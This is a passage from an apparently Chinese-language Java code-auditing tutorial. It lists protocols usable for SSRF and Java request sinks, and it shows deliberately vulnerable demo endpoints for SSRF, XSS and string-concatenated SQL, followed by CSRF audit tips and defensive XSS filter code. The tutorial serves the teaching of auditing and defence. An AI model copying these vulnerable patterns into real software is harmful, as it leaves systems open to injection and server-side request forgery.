class="hljs-keyword">https</span>;jar;netdoc;gopher<br></code></pre></td></tr></table></figure><p>SSRF（服务端请求伪造）攻击是一种安全漏洞，攻击者可以利用它来发送来自受害服务器的恶意请求。攻击者可以通过构造特定的HTTP请求来利用这个漏洞，引诱服务器进行非预期的网络交互。可以被用来执行SSRF攻击的协议包括但不限于：</p><ol><li><strong>HTTP&#x2F;HTTPS</strong>：这是SSRF攻击中最常见的协议，攻击者可以利用服务器向其他网站或在线服务发起HTTP或HTTPS请求。</li><li><strong>FTP</strong>（文件传输协议）：攻击者可以尝试用FTP协议访问内部FTP服务器或其他资源。</li><li><strong>file</strong>：通过<code>file://</code>协议，攻击者可能尝试访问本地或远程服务器的文件系统。</li><li><strong>dict</strong>：使用<code>dict://</code>协议，可能可以查询字典服务器。</li><li><strong>ldap</strong>：使用<code>ldap://</code>协议，攻击者可能尝试与轻量级目录访问协议（LDAP）服务器通信。</li><li><strong>gopher</strong>：<code>gopher://</code>协议能让攻击者与Gopher系统交互，尽管这个协议现在已经很少使用。</li><li><strong>telnet</strong>：<code>telnet://</code>协议可能被用来与Telnet服务交互。</li><li><strong>smtp</strong>：<code>smtp://</code>协议可以用来与邮件服务器交流。</li><li><strong>smb</strong>：使用<code>smb://</code>协议，可能可以在Windows网络上访问共享文件和服务。</li><li><strong>tftp</strong>：<code>tftp://</code>协议用于无盘工作站从TFTP服务器引导。</li><li><strong>redis</strong>，<strong>memcached</strong>，<strong>mongodb</strong>，<strong>mysql</strong> 等数据库协议：这些也可以被用来与内部数据库服务进行通信。</li></ol><p>Java中发起HTTP请求的类及函数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java">HttpURLConnection.getInputStream<br>URLConnection.getInputStream<br>Request.Get.execute<br>Request.Post.executurl<br>URL.openStream<br>ImagelO.read<br>OkHttpClient.newCall.execute<br>HttpClients.execute<br>HttpClients.executeMethod<br>HttpClicent<br>Request<br>HttpURLConnection.getInputStream<br>URLConnection<br>BasicHttpEntityEnclosingRequest<br>DefaultBHttpClientConnection<br>BasicHttpRe<br><br></code></pre></td></tr></table></figure><p>标准demo</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs JAVA"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloWorldController</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">HelloWorldController</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-meta">@RequestMapping(&#123;&quot;/in1&quot;&#125;)</span>  <span class="hljs-comment">//路由</span><br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">url1</span><span class="hljs-params">(String urls, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">HttpURLConnection</span> <span class="hljs-variable">connection</span> <span class="hljs-operator">=</span> (HttpURLConnection)(<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(urls)).openConnection();  <span class="hljs-comment">//漏洞所在</span><br>        connection.setRequestMethod(<span class="hljs-string">&quot;GET&quot;</span>);<br>        connection.connect();<br>        <span class="hljs-type">int</span> <span class="hljs-variable">responseCode</span> <span class="hljs-operator">=</span> connection.getResponseCode();<br>        System.out.println(responseCode);<br>        <span class="hljs-keyword">return</span> urls;<br>    &#125;  <span class="hljs-comment">//参数是urls string </span><br><br>    <span class="hljs-meta">@RequestMapping(&#123;&quot;/in2&quot;&#125;)</span><br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">url2</span><span class="hljs-params">(String urls, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">URL</span> <span class="hljs-variable">u</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(urls);<br>        <span class="hljs-type">BufferedImage</span> <span class="hljs-variable">img</span> <span class="hljs-operator">=</span> ImageIO.read(u); <span class="hljs-comment">//关键函数</span><br>        <span class="hljs-keyword">return</span> urls;<br>    &#125;  <span class="hljs-comment">//多为头像上传</span><br><br>    <span class="hljs-meta">@RequestMapping(&#123;&quot;/in3&quot;&#125;)</span><br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">url3</span><span class="hljs-params">(String urls, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">URL</span> <span class="hljs-variable">u</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(urls);<br>        u.openStream();<br>        <span class="hljs-keyword">return</span> urls;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h5><p><img src="image-20240318203243954.png" alt="image-20240318203243954"></p><p>在dai里标识</p><p><img src="image-20240318203321344.png" alt="image-20240318203321344"></p><p>审计：</p><p>一些增删改查方法，是否进行<code>Referer头检验</code>、<code>token检验</code> <code>无法构造的随机数参数</code>、<code>验证码密码</code></p><p>搜索<code>session[&quot;token&quot;]</code></p><h5 id="XSS漏洞"><a href="#XSS漏洞" class="headerlink" title="XSS漏洞"></a>XSS漏洞</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(&quot;/xss&quot;)</span><br><span class="hljs-keyword">public</span> ModelAndView <span class="hljs-title function_">xss</span><span class="hljs-params">(HttpServletRequest request,HttpServletResponse</span><br><span class="hljs-params">response)</span> <span class="hljs-keyword">throws</span> ServletException,IOException&#123;<br> <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;name&quot;</span>);<br> <span class="hljs-type">ModelAndView</span> <span class="hljs-variable">mav</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ModelAndView</span>(<span class="hljs-string">&quot;mmc&quot;</span>);<br> mav.getModel().put(<span class="hljs-string">&quot;uname&quot;</span>, name);<br> <span class="hljs-keyword">return</span> mav;<br>&#125;<br></code></pre></td></tr></table></figure><p>name参数传入</p><p>存储型</p><p>根据已知的用户ID查询该用户的数据并显示在JSP页面上。如果存入的数据存在未经过滤的恶意js代码。就会造成xss攻击。</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%  ...<br>    <span class="hljs-type">Statement</span> <span class="hljs-variable">stmt</span> <span class="hljs-operator">=</span> conn.createStatement();<br>    <span class="hljs-type">ResultSet</span> <span class="hljs-variable">rs</span> <span class="hljs-operator">=</span> stmt.executeQuery(<span class="hljs-string">&quot;select * from users where id =&quot;</span> + id);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">address</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">if</span> (rs != <span class="hljs-literal">null</span>) &#123;<br>        rs.next();<br>        address = rs.getString(<span class="hljs-string">&quot;address&quot;</span>);<br>    &#125;<br>%&gt;<br></code></pre></td></tr></table></figure><p><strong>xss防御</strong></p><p><strong>第一种：</strong></p><ul><li>自定义过滤器</li><li>重写HttpServletRequestWrapper、重写getHeader、getParameter、getParameterValues、getInputStream实现对传统“键值对”传参方式的过滤。</li><li>重写getInputStream实现对json方式传参的过滤，也就是@RequestBody参数</li></ul><p><strong>第二种：</strong></p><ul><li>自定义序列化器，对mappingJackson2HttpMessageConverter的objectMapper做设置</li><li>重写JsonDeserializer.deserialize()实现对入参的过滤 (PS: 数据转义后保存)</li><li>重写JsonSerializer.serialize()实现对出参的过滤 (PS: 数据原样保存, 取出来的时候转义)</li></ul><p>自定义过滤器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">XssFilter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Filter</span><br>&#123;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 排除链接</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> List&lt;String&gt; excludes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(FilterConfig filterConfig)</span> <span class="hljs-keyword">throws</span> ServletException<br>    &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">tempExcludes</span> <span class="hljs-operator">=</span> filterConfig.getInitParameter(<span class="hljs-string">&quot;excludes&quot;</span>);<br>        <span class="hljs-keyword">if</span> (StringUtils.isNotEmpty(tempExcludes))<br>        &#123;<br>            String[] url = tempExcludes.split(<span class="hljs-string">&quot;,&quot;</span>);<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; url != <span class="hljs-literal">null</span> &amp;&amp; i &lt; url.length; i++)<br>            &#123;<br>                excludes.add(url[i]);<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest request, ServletResponse response, FilterChain chain)</span><br>            <span class="hljs-keyword">throws</span> IOException, ServletException<br>    &#123;<br>        <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">req</span> <span class="hljs-operator">=</span> (HttpServletRequest) request;<br>        <span class="hljs-type">HttpServletResponse</span> <span class="hljs-variable">resp</span> <span class="hljs-operator">=</span> (HttpServletResponse) response;<br>        <span class="hljs-keyword">if</span> (handleExcludeURL(req, resp))<br>        &#123;<br>            <span class="hljs-comment">// 传递过滤器</span><br>            chain.doFilter(request, response);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-type">XssHttpServletRequestWrapper</span> <span class="hljs-variable">xssRequest</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">XssHttpServletRequestWrapper</span>((HttpServletRequest) request);<br>        chain.doFilter(xssRequest, response);<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">handleExcludeURL</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span><br>    &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> request.getServletPath();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> request.getMethod();<br>        <span class="hljs-comment">// GET DELETE 不过滤</span><br>        <span class="hljs-keyword">if</span> (method == <span class="hljs-literal">null</span> || HttpMethod.GET.matches(method) || HttpMethod.DELETE.matches(method))<br>        &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> StringUtils.matches(url, excludes);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span><br>    &#123;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>过滤方法（使用Ant风格的路径匹配规则）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 查找指定字符串是否匹配指定字符串列表中的任意一个字符串</span><br><span class="hljs-comment">     * </span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> str 指定字符串</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> strs 需要检查的字符串数组</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> 是否匹配</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">matches</span><span class="hljs-params">(String str, List&lt;String&gt; strs)</span><br>    &#123;<br>        <span class="hljs-keyword">if</span> (isEmpty(str) || isEmpty(strs))<br>        &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>        <span class="hljs-keyword">for</span> (String pattern : strs)<br>        &#123;<br>            <span class="hljs-keyword">if</span> (isMatch(pattern, str))<br>            &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 判断url是否与规则配置: </span><br><span class="hljs-comment">     * ? 表示单个字符; </span><br><span class="hljs-comment">     * * 表示一层路径内的任意字符串，不可跨层级; </span><br><span class="hljs-comment">     * ** 表示任意层路径;</span><br><span class="hljs-comment">     * </span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> pattern 匹配规则</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> url 需要匹配的url</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span></span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isMatch</span><span class="hljs-params">(String pattern, String url)</span><br>    &#123;<br>        <span class="hljs-type">AntPathMatcher</span> <span class="hljs-variable">matcher</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AntPathMatcher</span>();<br>        <span class="hljs-keyword">return</span> matcher.match(pattern, url);<br>    &#125;<br></code></pre></td></tr></table></figure><p>重写getParameterValues、getInputStream和isJsonRequest</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * XSS过滤处理</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> lh</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">XssHttpServletRequestWrapper</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServletRequestWrapper</span><br>&#123;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> request</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">XssHttpServletRequestWrapper</span><span class="hljs-params">(HttpServletRequest request)</span><br>    &#123;<br>        <span class="hljs-built_in">super</span>(request);<br>    &#125;<br><br>    <span class="hljs-comment">// 重写获取参数进行转义</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String[] getParameterValues(String name)<br>    &#123;<br>        String[] values = <span class="hljs-built_in">super</span>.getParameterValues(name);<br>        <span class="hljs-keyword">if</span> (values != <span class="hljs-literal">null</span>)<br>        &#123;<br>            <span class="hljs-type">int</span> <span class="hljs-variable">length</span> <span class="hljs-operator">=</span> values.length;<br>            String[] escapesValues = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[length];<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; length; i++)<br>            &#123;<br>                <span class="hljs-comment">// 防xss攻击和过滤前后空格</span><br>                escapesValues[i] = EscapeUtil.clean(values[i]).trim();<br>            &#125;<br>            <span class="hljs-keyword">return</span> escapesValues;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.getParameterValues(name);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> ServletInputStream <span class="hljs-title function_">getInputStream</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException<br>    &#123;<br>        <span class="hljs-comment">// 非json类型，直接返回</span><br>        <span class="hljs-keyword">if</span> (!isJsonRequest())<br>        &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.getInputStream();<br>        &#125;<br><br>        <span class="hljs-comment">// 为空，直接返回</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">json</span> <span class="hljs-operator">=</span> IOUtils.toString(<span class="hljs-built_in">super</span>.getInputStream(), <span class="hljs-string">&quot;utf-8&quot;</span>);<br>        <span class="hljs-keyword">if</span> (StringUtils.isEmpty(json))<br>        &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.getInputStream();<br>        &#125;<br><br>        <span class="hljs-comment">// xss过滤</span><br>        json = EscapeUtil.clean(json).trim();<br>        <span class="hljs-type">byte</span>[] jsonBytes = json.getBytes(<span class="hljs-string">&quot;utf-8&quot;</span>);<br>        <span class="hljs-keyword">final</span> <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(jsonBytes);<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServletInputStream</span>()<br>        &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isFinished</span><span class="hljs-params">()</span><br>            &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br><br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isReady</span><span class="hljs-params">()</span><br>            &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br><br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">available</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException<br>            &#123;<br>                <span class="hljs-keyword">return</span> jsonBytes.length;<br>            &#125;<br><br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setReadListener</span><span class="hljs-params">(ReadListener readListener)</span><br>            &#123;<br>            &#125;<br><br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">read</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException<br>            &#123;<br>                <span class="hljs-keyword">return</span> bis.read();<br>            &#125;<br>        &#125;;<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 是否是Json请求</span><br><span class="hljs-comment">     * </span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> request</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isJsonRequest</span><span class="hljs-params">()</span><br>    &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">header</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">super</span>.getHeader(HttpHeaders.CONTENT_TYPE);<br>        <span class="hljs-keyword">return</span> StringUtils.startsWithIgnoreCase(header, MediaType.APPLICATION_JSON_VALUE);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><p>getParameterValues：重写了获取参数值的方法，对参数值进行转义和过滤，防止XSS攻击。遍历原始的参数值数组，使用EscapeUtil.clean方法进行转义和过滤操作，然后返回转义后的参数值数组。</p></li><li><p>getInputStream：重写了获取请求输入流的方法。判断请求是否为JSON类型的请求，如果不是直接返回原始的输入流；如果是，对请求的JSON字符串进行XSS过滤处理。首先判断JSON字符串是否为空，如果为空直接返回原始的输入流；如果不为空，则使用EscapeUtil.clean方法进行转义和过滤操作，并将过滤后的JSON字符串转换为字节数组。然后创建一个ByteArrayInputStream对象，将字节数组作为输入流返回。</p></li><li><p>isJsonRequest：判断请求是否为JSON请求。通过获取请求头中的Content-Type字段，判断是否以”application&#x2F;json”开头，如果是则返回true，表示是JSON请求；否则返回false。</p></li></ul><p><strong>转义Html字符</strong></p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">clean</span>(<span class="hljs-params"><span class="hljs-title class_">String</span> content</span>)<br>    &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HTMLFilter</span>().<span class="hljs-title function_">filter</span>(content);<br>    &#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span 